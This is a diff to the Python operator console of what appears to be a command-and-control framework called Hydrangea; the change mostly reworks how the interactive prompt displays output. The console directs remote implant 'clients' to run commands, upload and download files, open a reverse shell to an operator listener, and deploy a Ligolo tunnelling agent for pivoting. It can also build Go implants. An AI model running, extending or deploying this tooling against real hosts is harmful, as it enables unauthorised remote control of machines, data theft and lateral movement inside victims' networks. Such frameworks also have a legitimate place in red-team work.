@@ -7,11 +7,21 @@ import os
 import shlex
 import sys
 import subprocess
+from datetime import datetime
 from typing import Dict, Optional, Tuple
 
 from utils.common import write_frame, read_frame
 from utils.go_builder import build_go_clients
-from utils.controller_ui import *
+from utils.controller_ui import (
+    UI,
+    print_error,
+    print_queued,
+    print_exec,
+    print_list,
+    print_session,
+    print_clients,
+    print_server_health,
+)
 
 __version__ = "3.0"
 
@@ -180,109 +190,93 @@ except Exception:
 
 # ---------- REPL loop ----------
 async def run_repl(args) -> None:
-    ui = UI(
-        use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False
-    )
-
-    # Create enhanced UI helper
-    enhanced_ui = create_enhanced_ui(ui)
-    client_formatter = EnhancedClientFormatter(ui)
-
-    # Show welcome screen
-    enhanced_ui.show_welcome_screen(__version__, args.host, args.port)
+    ui = UI(use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False)
+    ui.welcome(__version__, args.host, args.port)
 
     repl_parser, sub_map = build_repl_parser()
     commands = sorted([k for k in sub_map.keys() if k not in {"help"}]) + [
-        "help",
-        "quit",
-        "exit",
+        "help", "quit", "exit",
     ]
 
-    # active client context
     current_client: Optional[str] = None
+    session_start = datetime.now()
+    command_count = 0
 
     _setup_readline(commands)
 
     while True:
-        enhanced_ui.show_status_bar(args.host, args.port, current_client)
         try:
-            line = enhanced_ui.show_command_prompt()
+            line = ui.prompt(current_client)
         except (EOFError, KeyboardInterrupt):
-            enhanced_ui.show_goodbye_message()
+            ui.goodbye(command_count, session_start)
             return
 
-        if not line:
+        if not line or line.startswith("#"):
             continue
 
-        if line.startswith("#"):
-            continue
-
-        # Track command usage
-        enhanced_ui.increment_command_count()
-
+        # ---- built-in keywords handled before argparse ----
         if line.lower() in {"help", "?"}:
-            enhanced_ui.show_help_menu(commands, sub_map)
+            ui.help_menu(sub_map)
             continue
 
         if line.lower().startswith("help "):
-            _, _, cmd = line.partition(" ")
-            sp = sub_map.get(cmd.strip())
+            _, _, target_cmd = line.partition(" ")
+            sp = sub_map.get(target_cmd.strip())
             if not sp:
-                enhanced_ui.show_error_with_suggestions(
-                    f"Unknown command: {cmd}", ["Type 'help' to see all commands"]
-                )
-                continue
-            enhanced_ui.show_command_help(cmd.strip(), sp)
+                ui.error(f"Unknown command: {target_cmd.strip()}")
+            else:
+                ui.command_help(target_cmd.strip(), sp)
             continue
 
         if line.lower() in {"quit", "exit", "ciao", "bisous"}:
-            enhanced_ui.show_goodbye_message()
+            ui.goodbye(command_count, session_start)
             return
 
-        # Parse via argparse
+        command_count += 1
+
+        # ---- argparse dispatch ----
         try:
             ns = repl_parser.parse_args(shlex.split(line))
         except ValueError as e:
-            print(ui.TAG_ERR, str(e))
+            ui.error(str(e))
             continue
         except SystemExit:
             continue
 
         cmd = getattr(ns, "cmd", None)
         if not cmd:
-            print(ui.TAG_ERR, "No command parsed. Type 'help'.")
+            ui.error("No command parsed. Type 'help'.")
             continue
 
-        # ---- context commands ----
+        # helper: resolve target client from flag or active context
+        def _resolve_client(flag_value: Optional[str]) -> Optional[str]:
+            return flag_value or current_client
+
+        # ---- context ----
         if cmd == "use":
             prev = current_client
             current_client = ns.client.strip()
-            enhanced_ui.show_client_switch_notification(prev, current_client)
+            ui.show_client_switch(prev, current_client)
             continue
 
         if cmd == "unuse":
             if ns.client and current_client and ns.client != current_client:
-                print(
-                    f"{ui.TAG_INF} current is {ui.c(current_client, 'bold')}; did not unuse {ui.c(ns.client, 'bold')}"
+                ui.info(
+                    f"Active client is {ui.c(current_client, 'cyan')}; "
+                    f"did not clear {ui.c(ns.client, 'dim')}"
                 )
                 continue
-            enhanced_ui.show_client_clear_notification(current_client)
+            ui.show_client_clear(current_client)
             current_client = None
-            ui.rule()
             continue
 
-        # helper to resolve client in REPL (flag or active)
-        def _resolve_client(flag_value: Optional[str]) -> Optional[str]:
-            return flag_value or current_client
-
-        # ---- dispatch regular commands ----
+        # ---- fleet ----
         if cmd == "clients":
             resp, _ = await admin_send(
                 args.host, args.port, args.auth_token, {"action": "clients"}
             )
             if resp.get("type") == "CLIENTS":
-                clients = resp.get("clients", [])
-                client_formatter.format_clients_table(clients)
+                print_clients(ui, resp.get("clients", []))
             else:
                 print_error(ui, resp)
             continue
@@ -290,29 +284,26 @@ async def run_repl(args) -> None:
         if cmd == "ping":
             target = _resolve_client(ns.client)
             if not target:
-                enhanced_ui.show_no_client_error()
+                ui.show_no_client_error()
                 continue
             resp, _ = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
+                args.host, args.port, args.auth_token,
                 {"action": "ping", "target_id": target},
             )
             if resp.get("type") == "OK":
-                enhanced_ui.show_operation_success("Ping sent", target)
+                ui.success(f"Ping sent to {ui.c(target, 'cyan')}")
             else:
                 print_error(ui, resp)
             continue
 
+        # ---- files ----
         if cmd == "list":
             target = _resolve_client(ns.client)
             if not target:
-                enhanced_ui.show_no_client_error()
+                ui.show_no_client_error()
                 continue
             resp, payload = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
+                args.host, args.port, args.auth_token,
                 {
                     "action": "list",
                     "target_id": target,
@@ -330,23 +321,15 @@ async def run_repl(args) -> None:
         if cmd == "pull":
             target = _resolve_client(ns.client)
             if not target:
-                enhanced_ui.show_no_client_error()
+                ui.show_no_client_error()
                 continue
-
-            enhanced_ui.show_file_transfer_info("File Pull", ns.src, ns.dest, target)
-
             resp, _ = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
+                args.host, args.port, args.auth_token,
                 {"action": "pull", "target_id": target, "src": ns.src, "dest": ns.dest},
             )
             if resp.get("type") == "QUEUED":
-                enhanced_ui.show_operation_queued(
-                    "File transfer", target, f"{ns.src} → {ns.dest}"
-                )
-                hint = f"{ui.c('📁 Note:', 'dim')} File will appear in server storage when client completes"
-                print(f"{ui.TAG_INF} {hint}")
+                print_queued(ui, resp)
+                ui.info(f"File will arrive in server storage once the client responds.")
             else:
                 print_error(ui, resp)
             continue
@@ -354,31 +337,19 @@ async def run_repl(args) -> None:
         if cmd == "push":
             target = _resolve_client(ns.client)
             if not target:
-                enhanced_ui.show_no_client_error()
+                ui.show_no_client_error()
                 continue
             if not os.path.isfile(ns.src):
-                enhanced_ui.show_error_with_suggestions(
-                    f"Local file not found: {ns.src}",
-                    [
-                        "Check the file path",
-                        "Ensure the file exists",
-                        "Use absolute or relative path",
-                    ],
-                )
+                ui.error(f"Local file not found: {ns.src}")
                 continue
-
-            enhanced_ui.show_file_transfer_info("File Push", ns.src, ns.dest, target)
-
             try:
                 with open(ns.src, "rb") as f:
                     data = f.read()
             except Exception as e:
-                enhanced_ui.show_error_with_suggestions(f"Cannot read {ns.src}: {e}")
+                ui.error(f"Cannot read {ns.src}: {e}")
                 continue
             resp, _ = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
+                args.host, args.port, args.auth_token,
                 {
                     "action": "push",
                     "target_id": target,
@@ -388,27 +359,24 @@ async def run_repl(args) -> None:
                 data,
             )
             if resp.get("type") == "QUEUED":
-                enhanced_ui.show_operation_queued(
-                    "File upload", target, f"{ns.src} → {ns.dest}"
-                )
+                print_queued(ui, resp)
             else:
                 print_error(ui, resp)
             continue
 
+        # ---- execution ----
         if cmd == "exec":
             target = _resolve_client(ns.client)
             if not target:
-                enhanced_ui.show_no_client_error()
+                ui.show_no_client_error()
                 continue
             cmd_value = ns.command
             try:
-                cmd_value = json.loads(cmd_value)  # allow JSON list
+                cmd_value = json.loads(cmd_value)
             except Exception:
                 pass
             resp, payload = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
+                args.host, args.port, args.auth_token,
                 {
                     "action": "exec",
                     "target_id": target,
@@ -424,222 +392,140 @@ async def run_repl(args) -> None:
         if cmd == "session":
             target = _resolve_client(ns.client)
             if not target:
-                enhanced_ui.show_no_client_error()
+                ui.show_no_client_error()
                 continue
             resp, payload = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
+                args.host, args.port, args.auth_token,
                 {"action": "session_info", "target_id": target, "timeout": ns.timeout},
             )
-            if resp.get("type") == "RESULT_SESSION_INFO":
-                try:
-                    info = json.loads(payload.decode("utf-8")) if payload else {}
-                    enhanced_ui.show_session_summary(target, info)
-                except Exception:
-                    print_session(ui, target, resp, payload)
+            print_session(ui, target, resp, payload)
+            continue
+
+        if cmd == "reverse-shell":
+            target = _resolve_client(getattr(ns, "client", None))
+            if not target:
+                ui.show_no_client_error()
+                continue
+            ui.info(
+                f"Start your listener on {ui.c(ns.controller_addr, 'cyan')} "
+                f"before sending — client will dial immediately."
+            )
+            resp, _ = await admin_send(
+                args.host, args.port, args.auth_token,
+                {
+                    "action": "reverse_shell",
+                    "target_id": target,
+                    "controller_addr": ns.controller_addr,
+                },
+            )
+            if resp.get("type") == "QUEUED":
+                print_queued(ui, resp)
             else:
                 print_error(ui, resp)
             continue
 
+        if cmd == "port-forward":
+            target = _resolve_client(getattr(ns, "client", None))
+            if not target:
+                ui.show_no_client_error()
+                continue
+            if not os.path.isfile(ns.ligolo_path):
+                ui.error(f"Ligolo binary not found: {ns.ligolo_path}")
+                continue
+            try:
+                with open(ns.ligolo_path, "rb") as f:
+                    payload = f.read()
+            except Exception as e:
+                ui.error(f"Cannot read binary: {e}")
+                continue
+            filename = os.path.basename(ns.ligolo_path)
+            # Step 1: upload
+            resp, _ = await admin_send(
+                args.host, args.port, args.auth_token,
+                {"action": "push", "target_id": target, "dest": filename, "src_name": filename},
+                payload,
+            )
+            if resp.get("type") != "QUEUED":
+                print_error(ui, resp)
+                continue
+            ui.info(f"Upload queued: {ui.c(filename, 'cyan')} -> {ui.c(target, 'cyan')}")
+            # Step 2: run
+            resp, _ = await admin_send(
+                args.host, args.port, args.auth_token,
+                {
+                    "action": "port_forward",
+                    "target_id": target,
+                    "filename": filename,
+                    "connect_args": ns.connect_args,
+                },
+            )
+            if resp.get("type") == "QUEUED":
+                print_queued(ui, resp)
+            else:
+                print_error(ui, resp)
+            continue
+
+        # ---- build ----
         if cmd == "build-client":
-            # inherit controller defaults if not provided
             if ns.server_host is None:
                 ns.server_host = args.host
             if ns.server_port is None:
                 ns.server_port = args.port
             if ns.build_auth_token is None:
                 ns.build_auth_token = args.auth_token
-
-            # Show build configuration
-            build_config = {
-                "server_host": ns.server_host,
-                "server_port": ns.server_port,
-                "client_id": ns.client_id,
-                "out": ns.out,
-                "os": ns.os,
-                "arch": ns.arch,
-            }
-            enhanced_ui.show_build_summary(build_config)
+            ui.build_summary(ns)
             try:
                 build_go_clients(ui, ns, ns.agent_path)
             except Exception as e:
-                enhanced_ui.show_error_with_suggestions(
-                    f"Build error: {e}",
-                    [
-                        "Check Go installation",
-                        "Verify client source code exists",
-                        "Check output directory permissions",
-                    ],
-                )
+                ui.error(f"Build failed: {e}")
             continue
 
+        # ---- server / local ----
         if cmd == "server-status":
             resp, _ = await admin_send(
                 args.host, args.port, args.auth_token, {"action": "health_status"}
             )
-            if resp.get("type") == "HEALTH_STATUS":
-                enhanced_ui.show_server_health(resp)
-            else:
-                print_error(ui, resp)
-            continue
-
-        # ---- reverse shell ----
-        if cmd == "reverse-shell":
-            controller_addr = ns.controller_addr
-            target = _resolve_client(getattr(ns, "client", None))
-            if not controller_addr:
-                enhanced_ui.show_error_with_suggestions(
-                    "Controller address required (host:port)"
-                )
-                continue
-            if not target:
-                enhanced_ui.show_no_client_error()
-                continue
-            resp, _ = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
-                {
-                    "action": "reverse_shell",
-                    "target_id": target,
-                    "controller_addr": controller_addr,
-                },
-            )
-            if resp.get("type") == "QUEUED":
-                enhanced_ui.show_operation_queued(
-                    "Reverse shell", target, f"→ {controller_addr}"
-                )
-                print(
-                    f"{ui.TAG_INF} 🌐 Open a listener on {ui.c(controller_addr, 'bold')} to receive the shell"
-                )
-            else:
-                print_error(ui, resp)
-            continue
-
-        # ---- port forward ----
-        if cmd == "port-forward":
-            ligolo_path = ns.ligolo_path
-            connect_args = ns.connect_args
-            target = _resolve_client(getattr(ns, "client", None))
-            if not target:
-                enhanced_ui.show_no_client_error()
-                continue
-            if not os.path.isfile(ligolo_path):
-                enhanced_ui.show_error_with_suggestions(
-                    "Ligolo agent binary not found",
-                    ["Verify --ligolo-path", "Check file permissions"],
-                )
-                continue
-            try:
-                with open(ligolo_path, "rb") as f:
-                    payload = f.read()
-            except Exception as e:
-                enhanced_ui.show_error_with_suggestions(f"Failed to read binary: {e}")
-                continue
-            filename = os.path.basename(ligolo_path)
-
-            # Step 1: upload the agent to the target
-            resp, _ = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
-                {
-                    "action": "push",
-                    "target_id": target,
-                    "dest": filename,
-                    "src_name": filename,
-                },
-                payload,
-            )
-            if resp.get("type") != "QUEUED":
-                print_error(ui, resp)
-                continue
-            enhanced_ui.show_operation_queued("File upload", target, filename)
-
-            # Step 2: run the uploaded agent
-            resp, _ = await admin_send(
-                args.host,
-                args.port,
-                args.auth_token,
-                {
-                    "action": "port_forward",
-                    "target_id": target,
-                    "filename": filename,
-                    "connect_args": connect_args,
-                },
-            )
-            if resp.get("type") == "QUEUED":
-                enhanced_ui.show_operation_queued("Port forward", target, filename)
-            else:
-                print_error(ui, resp)
+            print_server_health(ui, resp)
             continue
 
         if cmd == "local":
-            local_command = ns.local_command
             try:
-                proc = subprocess.Popen(local_command, shell=True)
-                enhanced_ui.show_operation_success(
-                    "Local command started", f"PID {proc.pid}"
-                )
+                proc = subprocess.Popen(ns.local_command, shell=True)
+                ui.info(f"PID {proc.pid}  running: {ui.c(ns.local_command, 'dim')}")
                 try:
-                    proc.wait(timeout=300)  # 5-minute hard limit
-                    enhanced_ui.show_operation_success(
-                        "Local command finished", f"exit {proc.returncode}"
-                    )
+                    proc.wait(timeout=300)
+                    ui.success(f"exit {proc.returncode}")
                 except subprocess.TimeoutExpired:
                     proc.kill()
-                    enhanced_ui.show_error_with_suggestions(
-                        "Local command timed out after 5 min — process killed"
-                    )
+                    ui.error("Timed out after 5 min — process killed.")
                 except KeyboardInterrupt:
                     proc.terminate()
-                    enhanced_ui.show_operation_success(
-                        "Local command interrupted", f"PID {proc.pid}"
-                    )
-                ui.rule()
+                    ui.info("Interrupted.")
             except Exception as e:
-                enhanced_ui.show_error_with_suggestions(
-                    f"Failed to start local command: {e}"
-                )
-                ui.rule()
+                ui.error(f"Failed to start: {e}")
             continue
 
-        enhanced_ui.show_error_with_suggestions(
-            f"Unknown command: {cmd}",
-            ["Type 'help' to see available commands", "Check command spelling"],
-        )
+        ui.error(f"Unknown command: {cmd}  (type 'help')")
 
 
 def start_server(args):
-    ui = UI(
-        use_color=(not args.no_color),
-        show_banner=(not args.no_banner),
-        quiet=args.quiet,
-    )
+    ui = UI(use_color=(not args.no_color), show_banner=False, quiet=args.quiet)
     ui.rule(" start server ")
-    ui.headline(f"{ui.TAG_INF} Starting Hydrangea server...")
     ui.kv("Host", args.host)
     ui.kv("Port", args.port)
-    ui.kv("Auth Token", args.auth_token)
-    ui.hr()
+    ui.rule()
     cmd = [
         sys.executable,
         "Hydrangea-server.py",
-        "--host",
-        args.host,
-        "--port",
-        str(args.port),
-        "--auth-token",
-        args.auth_token,
+        "--host", args.host,
+        "--ports", str(args.port),   # server uses --ports (plural)
+        "--auth-token", args.auth_token,
     ]
     try:
-        proc = subprocess.Popen(
-            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-        ui.headline(f"{ui.TAG_OK} Server process started (PID {proc.pid})")
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ui.success(f"Server process started (PID {proc.pid})")
     except Exception as e:
-        ui.headline(f"{ui.TAG_ERR} Failed to start server: {e}")
+        ui.error(f"Failed to start server: {e}")
     ui.rule()
 
 
